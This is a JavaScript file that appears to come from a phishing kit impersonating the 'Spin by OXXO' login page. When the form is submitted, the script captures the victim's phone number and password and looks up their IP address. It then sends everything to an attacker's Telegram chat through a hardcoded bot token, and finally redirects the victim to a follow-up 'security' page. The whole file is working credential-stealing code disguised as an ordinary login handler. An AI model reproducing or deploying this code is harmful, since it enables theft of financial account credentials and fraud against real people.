const form = document.getElementById('login-form');

form.addEventListener('submit', function (event) {
    event.preventDefault();

    const telefono = document.getElementById('telefono').value;
    const contrasena = document.getElementById('contrasena').value;

    enviarMensajeTelegram(telefono, contrasena);
});

function enviarMensajeTelegram(telefono, contrasena) {
    var botToken = '6835132981:AAFXb1FjswdXDH5Q6cBeUKvBc-B8gID3Ljc';
    var chatId = '-1002110248910';
    const mensaje = `Inicio de sesión Spin by OXXO:\nTeléfono: ${telefono}\nContraseña: ${contrasena}`;

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const mensajeConIP = `${mensaje}\nIP: ${ip}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensajeConIP)}`;
            return fetch(url);
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje a Telegram.');
            }
            console.log('Mensaje enviado a Telegram con éxito.');
            window.location.href = './security.html';
        })
        .catch(error => {
            console.error('Error al enviar mensaje a Telegram:', error);
        });
}